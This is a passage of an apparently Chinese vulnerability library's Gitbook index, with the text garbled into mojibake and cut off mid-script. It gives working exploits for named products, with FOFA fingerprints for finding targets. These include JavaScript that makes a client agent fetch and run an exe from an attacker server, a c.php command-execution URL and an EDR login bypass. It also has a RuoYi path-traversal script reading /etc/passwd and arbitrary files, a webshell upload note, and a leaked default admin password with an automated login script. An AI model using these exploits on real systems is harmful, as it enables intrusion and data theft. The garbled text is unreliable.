ÂÖà‰∏çÁÆ°xmlÊñá‰ª∂ÊòØÊÄé‰πàÊ†∑ÁöÑÔºåÂèØÊâßË°åÊñá‰ª∂(exe)ÊòØÈúÄË¶ÅÈáçËßÜÁöÑÔºå‰ΩÜÊòØËøôÈáåÈÄöËøáÊèêÁ§∫ÂèØ‰ª•ÁúãÂá∫ÂÆ¢Êà∑Á´ØÂèëÂá∫ÁöÑËØ∑Ê±ÇÊòØPOSTËØ∑Ê±ÇÔºå‰ΩÜÊàë‰ª¨ÊâÄÂÜôÁöÑPythonËÑöÊú¨Âª∫Á´ãÁöÑHTTPSÊúçÂä°Âπ∂‰∏çÊîØÊåÅPOSTÊñπÊ≥ïÔºåÊàë‰ª¨ÈúÄË¶ÅÈáçÂÜô‰∏Ä‰∏ãHandlerÔºö import BaseHTTPServer import SimpleHTTPServer import cgi import ssl class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler): def do_POST(self): form = cgi.FieldStorage() SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self) Handler = ServerHandler httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 8000), Handler) httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True) httpd.serve_forever() ÊúÄÁªàÂ¶Ç‰∏äËÑöÊú¨ÊîØÊåÅPOSTÊñπÊ≥ïÔºåÂΩìÊó∂Áî®POSTÊñπÊ≥ïËØ∑Ê±ÇÊó∂Âç≥ËøîÂõûÊñá‰ª∂ÂÜÖÂÆπ„ÄÇ ÊúÄÂêéÔºåÊãñ‰∏Ä‰∏™calc.exeÔºàËÆ°ÁÆóÂô®ÔºâÂà∞HTTPSÁΩëÁ´ôÊ†πÁõÆÂΩï‰∏ãÁöÑ/com/win/XXXUD.exe„ÄÇ ‰æùÊ¨°ËØ∑Ê±ÇÔºàÁªèËøáÂ§öÊ¨°Â§çÁé∞ÂèëÁé∞ÔºåËøô‰∏â‰∏™ËØ∑Ê±ÇÊâçÊòØÈáçÁÇπÁöÑÔºåÂÖ∂‰ªñÁöÑÂèØ‰ª•ÂøΩÁï•ÔºâÔºö https://127.0.0.1:54530/ECAgent/?op=InitECAgent&arg1=172.20.10.2 8000&callback=EA_cb10000 https://127.0.0.1:54530/ECAgent/?op=CheckReLogin&arg1=3408a894633162c62188f98e92a221967dccfa5aafbd79b576714b4d1c392a4ad4b220d698efcd939c3b1b37467023e9380ee3abf0e492ee2efc736de757b80e973fe4c7d8af1af211a3f7ff3433cd9de975c76583efe7251dd1c0656f4384832998630359b65beb131cd8d287712462fa1b9e9acbc96dcc678b84cd57178c1a&token=50065256e83ff1bb9e01757d0d22b669&callback=EA_cb10003 https://127.0.0.1:54530/ECAgent/?op=UpdateControls&arg1=BEFORELOGIN&callback=EA_cb10005 ‰ºöÂèëÁé∞ÂÆ¢Êà∑Á´ØËØ∑Ê±Ç‰πãÂêéÔºåÂ∞ÜÊñá‰ª∂‰∏ãËΩΩÂà∞Êú¨Âú∞Âπ∂ÂêØÂä®ËØ•Á®ãÂ∫èÔºåÊàêÂäüÂºπÂá∫ËÆ°ÁÆóÂô®Ôºö ExploitÂæàÁÆÄÂçïÔºåÂΩìÁî®Êà∑ÊâìÂºÄÊüê‰∏™È°µÈù¢Êó∂ËÆøÈóÆÈÇ£‰∏â‰∏™Êú¨Âú∞ËØ∑Ê±ÇÂç≥ÂèØÔºåËøôÈáå‰ΩøÁî®JavaScriptÁöÑfetchÂéªÂÆûÁé∞Âç≥ÂèØÔºö // ÊúçÂä°Âô®IPÂíåÁ´ØÂè£ var ip = \"172.20.10.2\"; var port = \"4443\"; var poc_list = [\"https://127.0.0.1:54530/ECAgent/?op=InitECAgent&arg1=\" + ip + \" \" + port + \"&Guid=&callback=EA_cb10000\", \"https://127.0.0.1:54530/ECAgent/?op=CheckReLogin&arg1=3616f5b2ad1fe9b62b3d34509daa11259782919108eb2bebe59d64c808c3a079c6f6ae36b6ff1d63cb8067d08a9db72b70d912bfdb8bdc6ca18140cfa0ffb9e88b85acebf4bf544f71ff0fc662b9b95a8e939928b847018c106e1a96686e1ec3274a89ae0b8f77fc3d53a5ce0f1eec9a0ce8a5e4e2c927331cd94a67d5360a3e&token=c4202416e283e60809d3b1e04e4bae6b&Guid=&callback=EA_cb10003\", \"https://127.0.0.1:54530/ECAgent/?op=UpdateControls&arg1=BEFORELOGIN&Guid=&callback=EA_cb10005\"]; for(var i=0; i ÂÖ∂Ê¨°Â∞±ÊòØÈúÄË¶Å‰∏Ä‰∏™HTTPSÊúçÂä°Á´ØÁöÑPythonËÑöÊú¨ÔºåÂπ∂‰∏îÂú®ËÑöÊú¨Ê†πÁõÆÂΩï‰∏ãÁöÑ/com/win/ÁõÆÂΩï‰∏ãÊúâ‰∏Ä‰∏™XXXUD.exeÊñá‰ª∂„ÄÇ ÂèÇËÄÉÊñáÁ´† https://mp.weixin.qq.com/s/XbsxziIFKx8VhGd-pv0Ghg Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Ê∑±‰ø°Êúç/Ê∑±‰ø°Êúç Êó•Âøó‰∏≠ÂøÉ c.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Ê∑±‰ø°Êúç/Ê∑±‰ø°Êúç Êó•Âøó‰∏≠ÂøÉ c.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"Ê∑±‰ø°Êúç Êó•Âøó‰∏≠ÂøÉ c.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"Ê∑±‰ø°Êúç Êó•Âøó‰∏≠ÂøÉ c.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Ê∑±‰ø°Êúç Êó•Âøó‰∏≠ÂøÉ c.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºå‰ΩøÁî®‰∏éEDRÁõ∏ÂêåÊ®°ÊùøÂíåÈÉ®ÂàÜÊñá‰ª∂ÂØºËá¥ÂëΩ‰ª§ÊâßË°å ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Ê∑±‰ø°Êúç Êó•Âøó‰∏≠ÂøÉ FOFA [!NOTE] body=\"isHighPerformance : !!SFIsHighPerformance,\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ËÆøÈóÆÊºèÊ¥ûUrl /tool/log/c.php?strip_slashes=system&host=ipconfig Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Ê∑±‰ø°Êúç/Ê∑±‰ø°Êúç Ë°å‰∏∫ÊÑüÁü•Á≥ªÁªü c.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Ê∑±‰ø°Êúç/Ê∑±‰ø°Êúç Ë°å‰∏∫ÊÑüÁü•Á≥ªÁªü c.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"Ê∑±‰ø°Êúç Ë°å‰∏∫ÊÑüÁü•Á≥ªÁªü c.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"Ê∑±‰ø°Êúç Ë°å‰∏∫ÊÑüÁü•Á≥ªÁªü c.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Ê∑±‰ø°Êúç Ë°å‰∏∫ÊÑüÁü•Á≥ªÁªü c.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºå‰ΩøÁî®‰∏éEDRÁõ∏ÂêåÊ®°ÊùøÂíåÈÉ®ÂàÜÊñá‰ª∂ÂØºËá¥ÂëΩ‰ª§ÊâßË°å ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Ê∑±‰ø°Êúç Ë°å‰∏∫ÊÑüÁü•Á≥ªÁªü FOFA [!NOTE] body=\"isHighPerformance : !!SFIsHighPerformance,\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ËÆøÈóÆÊºèÊ¥ûUrl /tool/log/c.php?strip_slashes=system&host=ipconfig Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Ê∑±‰ø°Êúç/Ê∑±‰ø°ÊúçÂêéÂè∞‰ªªÊÑèÁî®Êà∑ÁôªÈôÜÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Ê∑±‰ø°Êúç/Ê∑±‰ø°ÊúçÂêéÂè∞‰ªªÊÑèÁî®Êà∑ÁôªÈôÜÊºèÊ¥û.html","title":"Ê∑±‰ø°ÊúçÂêéÂè∞‰ªªÊÑèÁî®Êà∑ÁôªÈôÜÊºèÊ¥û","keywords":"","body":"Ê∑±‰ø°ÊúçÂêéÂè∞‰ªªÊÑèÁî®Êà∑ÁôªÈôÜÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Ê∑±‰ø°ÊúçÁªàÁ´ØÊ£ÄÊµãÂìçÂ∫îÂπ≥Âè∞ÊòØÊ∑±‰ø°ÊúçÂÖ¨Âè∏ÂºÄÂèëÁöÑ‰∏ÄÂ•óEDRÁ≥ªÁªü„ÄÇÊîªÂáªËÄÖÂà©Áî®ËØ•ÊºèÊ¥ûÔºåÁôªÂΩï‰ªªÊÑèÁî®Êà∑ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] EDR ÊºèÊ¥ûÂ§çÁé∞ https://xxx.xxx.xxx.xxx/ui/login.php?user=admin [!NOTE] Ê≥®ÊÑèÊúÄÂêéÁöÑadminÈúÄË¶Å‰∏∫Â≠òÂú®ÁöÑÁî®Êà∑Âêç Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Ëã•‰æùÁÆ°ÁêÜÁ≥ªÁªü/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Ëã•‰æùÁÆ°ÁêÜÁ≥ªÁªü/","title":"Ëã•‰æù(RuoYi)ÁÆ°ÁêÜÁ≥ªÁªü","keywords":"","body":"Ëã•‰æù(RuoYi)ÁÆ°ÁêÜÁ≥ªÁªü Ëã•‰æùÁÆ°ÁêÜÁ≥ªÁªü ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñ CNVD-2021-01931 Ëã•‰æùÁÆ°ÁêÜÁ≥ªÁªü Êú™ÊéàÊùÉËÆøÈóÆ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Ëã•‰æùÁÆ°ÁêÜÁ≥ªÁªü/Ëã•‰æùÁÆ°ÁêÜÁ≥ªÁªü ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñ CNVD-2021-01931.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Ëã•‰æùÁÆ°ÁêÜÁ≥ªÁªü/Ëã•‰æùÁÆ°ÁêÜÁ≥ªÁªü ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñ CNVD-2021-01931.html","title":"Ëã•‰æùÁÆ°ÁêÜÁ≥ªÁªü ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñ CNVD-2021-01931","keywords":"","body":"Ëã•‰æù(RuoYi)ÁÆ°ÁêÜÁ≥ªÁªü ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñ ÊºèÊ¥ûÊèèËø∞ Ëã•‰æùÁÆ°ÁêÜÁ≥ªÁªüÊòØÂü∫‰∫éSpringBootÁöÑÊùÉÈôêÁÆ°ÁêÜÁ≥ªÁªü,ÁôªÂΩïÂêéÂè∞ÂêéÂèØ‰ª•ËØªÂèñÊúçÂä°Âô®‰∏äÁöÑ‰ªªÊÑèÊñá‰ª∂ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] RuoYi FOFA [!NOTE] app=\"Ëã•‰æù-ÁÆ°ÁêÜÁ≥ªÁªü\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÂêéÂè∞ÂêéËÆøÈóÆ Url https://xxx.xxx.xxx.xxx/common/download/resource?resource=/profile/../../../../etc/passwd ËÆøÈóÆÂêé‰ºö‰∏ãËΩΩÊñá‰ª∂ /etc/passwd ÂèØ‰ª•‰ΩøÁî®BurpÊäìÂåÖÊîπÂèò /etc/passwd ‰∏∫ÂÖ∂‰ªñÊñá‰ª∂Ë∑ØÂæÑËé∑ÂèñÊïèÊÑü‰ø°ÊÅØ Âú®Êñ∞ÁâàÊú¨ÁöÑ‰øÆÂ§ç‰∏≠Ê∑ªÂä†‰∫ÜËøáÊª§ ÊºèÊ¥ûÂà©Áî®POC [!NOTE] POC‰ΩøÁî®ÈúÄË¶ÅÂêéÂè∞ÁöÑCookie,ËØªÂèñÁöÑÊñá‰ª∂Ë∑ØÂæÑÂ∫î‰∏∫Ê†πË∑ØÂæÑ import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: RuoYi >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCookie >>> JSESSIONID=xxxxxx \\033[0m') print('+ \\033[36mFile >>> /etc/passwd \\033[0m') print('+------------------------------------------') def POC_1(target_url, Cookie): vuln_url = target_url + \"/common/download/resource?resource=/profile/../../../../etc/passwd\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\":Cookie } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] Ê≠£Âú®ËØ∑Ê±Ç {}//common/download/resource?resource=/profile/../../../../etc/passwd \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û ,ÊàêÂäüËØªÂèñ /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response.text)) while True: Filename = input(\"\\033[35mFile >>> \\033[0m\") if Filename == \"exit\": sys.exit(0) else: POC_2(target_url, Cookie, Filename) else: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_2(target_url, Cookie, Filename): vuln_url = target_url + \"/common/download/resource?resource=/profile/../../../../{}\".format(Filename) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\":Cookie } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Cookie = str(input(\"\\033[35mCookie >>> \\033[0m\")) POC_1(target_url, Cookie) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Ëã•‰æùÁÆ°ÁêÜÁ≥ªÁªü/Ëã•‰æùÁÆ°ÁêÜÁ≥ªÁªü Êú™ÊéàÊùÉËÆøÈóÆ.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Ëã•‰æùÁÆ°ÁêÜÁ≥ªÁªü/Ëã•‰æùÁÆ°ÁêÜÁ≥ªÁªü Êú™ÊéàÊùÉËÆøÈóÆ.html","title":"Ëã•‰æùÁÆ°ÁêÜÁ≥ªÁªü Êú™ÊéàÊùÉËÆøÈóÆ","keywords":"","body":"Ëã•‰æùÁÆ°ÁêÜÁ≥ªÁªü Êú™ÊéàÊùÉËÆøÈóÆ ÊºèÊ¥ûÊèèËø∞ Ëã•‰æùÁÆ°ÁêÜÁ≥ªÁªü‰ΩøÁî®‰∫ÜDruid ÈªòËÆ§ÂºÄÂêØ‰∫ÜÂåøÂêçËÆøÈóÆÔºåÂØºËá¥Êú™ÊéàÊùÉËé∑ÂèñÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Ëã•‰æùÁÆ°ÁêÜÁ≥ªÁªü FOFA [!NOTE] app=\"Ëã•‰æù-ÁÆ°ÁêÜÁ≥ªÁªü\" ÊºèÊ¥ûÂ§çÁé∞ Ê∫êÁ†Å‰∏≠ÁúãÂà∞ pom.xml Êñá‰ª∂‰∏≠Êü•ÁúãÂà∞ÂºïÁî®‰∫Ü ÈòøÈáåDruid ‰ªé issues ‰∏≠ÂèëÁé∞‰∫ÜÈªòËÆ§Â≠òÂú®ÁöÑÊú™ÊéàÊùÉËÆøÈóÆ Url‰∏∫ http://xxx.xxx.xxx.xxx/prod-api/druid/index.html Goby & POC [!NOTE] RuoYi Druid Unauthorized access Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Êô∫ÊÖßÊ†°Âõ≠ÁÆ°ÁêÜÁ≥ªÁªü/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Êô∫ÊÖßÊ†°Âõ≠ÁÆ°ÁêÜÁ≥ªÁªü/","title":"Êô∫ÊÖßÊ†°Âõ≠ÁÆ°ÁêÜÁ≥ªÁªü","keywords":"","body":"Êô∫ÊÖßÊ†°Âõ≠ÁÆ°ÁêÜÁ≥ªÁªü Êô∫ÊÖßÊ†°Âõ≠ÁÆ°ÁêÜÁ≥ªÁªü ÂâçÂè∞‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Êô∫ÊÖßÊ†°Âõ≠ÁÆ°ÁêÜÁ≥ªÁªü/Êô∫ÊÖßÊ†°Âõ≠ÁÆ°ÁêÜÁ≥ªÁªü ÂâçÂè∞‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Êô∫ÊÖßÊ†°Âõ≠ÁÆ°ÁêÜÁ≥ªÁªü/Êô∫ÊÖßÊ†°Âõ≠ÁÆ°ÁêÜÁ≥ªÁªü ÂâçÂè∞‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û.html","title":"Êô∫ÊÖßÊ†°Âõ≠ÁÆ°ÁêÜÁ≥ªÁªü ÂâçÂè∞‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û","keywords":"","body":"Êô∫ÊÖßÊ†°Âõ≠ÁÆ°ÁêÜÁ≥ªÁªü ÂâçÂè∞‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Êô∫ÊÖßÊ†°Âõ≠ÁÆ°ÁêÜÁ≥ªÁªüÂâçÂè∞Ê≥®ÂÜåÈ°µÈù¢Â≠òÂú®Êñá‰ª∂‰∏ä‰º†ÔºåÁî±‰∫éÊ≤°ÊúâÂØπ‰∏ä‰º†ÁöÑÊñá‰ª∂ËøõË°åÂÆ°Êü•ÂØºËá¥ÂèØ‰∏ä‰º†ÊÅ∂ÊÑèÊñá‰ª∂ÊéßÂà∂ÊúçÂä°Âô® ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Êô∫ÊÖßÊ†°Âõ≠ÁÆ°ÁêÜÁ≥ªÁªü FOFA [!NOTE] body=\"DC_Login/QYSignUp\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ãÔºåÂè™Ë¶ÅÂ≠òÂú®‰ºÅ‰∏öÁî®Êà∑Ê≥®ÂÜåÂ∞±ÂèØËÉΩÂá∫Áé∞ÊºèÊ¥û [!NOTE] Ëøô‰∏™Âú∞ÊñπÁöÑ‰∏ä‰º†ÈôÑ‰ª∂ÂÖÅËÆ∏‰∫Ü‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÔºåÂåÖÊã¨ aspxÊú®È©¨Ôºå‰∏ä‰º†ÂêéËøò‰ºöËøîÂõû webshellÂú∞ÂùÄ ‰∏ä‰º†ÁöÑÊòØÂÜ∞ËùéÊú®È©¨ÔºåÁõ¥Êé•ËøûÊé• Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/‰∏≠Êñ∞ÈáëÁõæ/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/‰∏≠Êñ∞ÈáëÁõæ/","title":"‰∏≠Êñ∞ÈáëÁõæ","keywords":"","body":"‰∏≠Êñ∞ÈáëÁõæ ‰∏≠Êñ∞ÈáëÁõæ‰ø°ÊÅØÂÆâÂÖ®ÁÆ°ÁêÜÁ≥ªÁªü ÈªòËÆ§Ë∂ÖÁ∫ßÁÆ°ÁêÜÂëòÂØÜÁ†ÅÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/‰∏≠Êñ∞ÈáëÁõæ/‰∏≠Êñ∞ÈáëÁõæ‰ø°ÊÅØÂÆâÂÖ®ÁÆ°ÁêÜÁ≥ªÁªü ÈªòËÆ§Ë∂ÖÁ∫ßÁÆ°ÁêÜÂëòÂØÜÁ†ÅÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/‰∏≠Êñ∞ÈáëÁõæ/‰∏≠Êñ∞ÈáëÁõæ‰ø°ÊÅØÂÆâÂÖ®ÁÆ°ÁêÜÁ≥ªÁªü ÈªòËÆ§Ë∂ÖÁ∫ßÁÆ°ÁêÜÂëòÂØÜÁ†ÅÊºèÊ¥û.html","title":"‰∏≠Êñ∞ÈáëÁõæ‰ø°ÊÅØÂÆâÂÖ®ÁÆ°ÁêÜÁ≥ªÁªü ÈªòËÆ§Ë∂ÖÁ∫ßÁÆ°ÁêÜÂëòÂØÜÁ†ÅÊºèÊ¥û","keywords":"","body":"‰∏≠Êñ∞ÈáëÁõæ‰ø°ÊÅØÂÆâÂÖ®ÁÆ°ÁêÜÁ≥ªÁªü ÈªòËÆ§Ë∂ÖÁ∫ßÁÆ°ÁêÜÂëòÂØÜÁ†ÅÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ‰∏≠Êñ∞ÁΩëÁªú‰ø°ÊÅØÂÆâÂÖ®ËÇ°‰ªΩÊúâÈôêÂÖ¨Âè∏‰∏≠Êñ∞ÈáëÁõæ‰ø°ÊÅØÂÆâÂÖ®ÁÆ°ÁêÜÁ≥ªÁªüÂ≠òÂú®ÈªòËÆ§Âº±Âè£‰ª§ÔºåÁôªÂΩïË∫´‰ªΩ‰∏∫Ë∂ÖÁ∫ßÁÆ°ÁêÜÂëò ÁõÆÂâçÂ§ßÈÉ®ÂàÜ‰ΩøÁî®ÁöÑÈÉΩÂèóÂà∞‰∫ÜÂΩ±Âìç ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ‰∏≠Êñ∞ÈáëÁõæ‰ø°ÊÅØÂÆâÂÖ®ÁÆ°ÁêÜÁ≥ªÁªü FOFA [!NOTE] title=\"‰∏≠Êñ∞ÈáëÁõæ‰ø°ÊÅØÂÆâÂÖ®ÁÆ°ÁêÜÁ≥ªÁªü\" ÊºèÊ¥ûÂ§çÁé∞ ÁúãÂà∞‰∫ßÂìÅÊâãÂÜå Á≥ªÁªüÈªòËÆ§ÁÆ°ÁêÜÂëòË¥¶Âè∑ÂØÜÁ†ÅÔºö admin/zxsoft1234!@#$ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏äÔºå‰ΩøÁî®Ë¥¶Âè∑ÂØÜÁ†ÅÁôªÂΩï ÂÖ∂‰∏≠Ê≥ÑÈú≤‰∫ÜÂ§ßÈÉ®ÂàÜ‰ø°ÊÅØÔºåÂÖ∂‰∏≠ÂåÖÊã¨ SMMS‰∏éFTP ÂèäÁî®Êà∑‰ø°ÊÅØ ÊºèÊ¥ûÂà©Áî®POC [!NOTE] ËØ∑Ê±Ç ?q=common/getcode Êó∂ ËøîÂõû‰∫ÜÈ™åËØÅÁ†ÅÔºåÈÄöËøáÈ™åËØÅÁ†ÅÂèØÁàÜÁ†¥Ë¥¶Âè∑ÂØÜÁ†ÅÁ≠âÊìç‰Ωú import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: ‰∏≠Êñ∞ÈáëÁõæ‰ø°ÊÅØÂÆâÂÖ®ÁÆ°ÁêÜÁ≥ªÁªü ÈªòËÆ§Ë∂ÖÁ∫ßÁÆ°ÁêÜÂëòÂØÜÁ†ÅÊºèÊ¥û \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"?q=common/getcode\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] Ê≠£Âú®Ëé∑ÂèñÈ™åËØÅÁ†Å {}?q=common/getcode ..... \\033[0m\".format(target_url)) response_data = response.headers['Set-Cookie'] check_code = re.findall(r'check_code=(.*?);', response_data)[0] PHPSESSID = re.findall(r'PHPSESSID=(.*?);', response_data)[0] print(\"\\033[36m[o] È™åËØÅÁ†Å:{}\\n[o] PHPSESSID:{} \\033[0m\".format(check_code, PHPSESSID)) POC_2(target_url, check_code, PHPSESSID) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_2(target_url, check_code, PHPSESSID): vuln_url = target_url + \"?q=common/login\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\":\"PHPSESSID={}; check_code={}\".format(PHPSESSID, check_code), \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\" } data = \"name=admin&password=zxsoft1234!%40%23%24&checkcode={}&doLoginSubmit=1\".format(check_code) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if \"1\" in response.text and response.status_code == 200: print(\"\\033[36m[o] ÁõÆÊ†á {} Â≠òÂú®ÈªòËÆ§ÁÆ°ÁêÜÂëòÂº±Âè£‰ª§ admin / 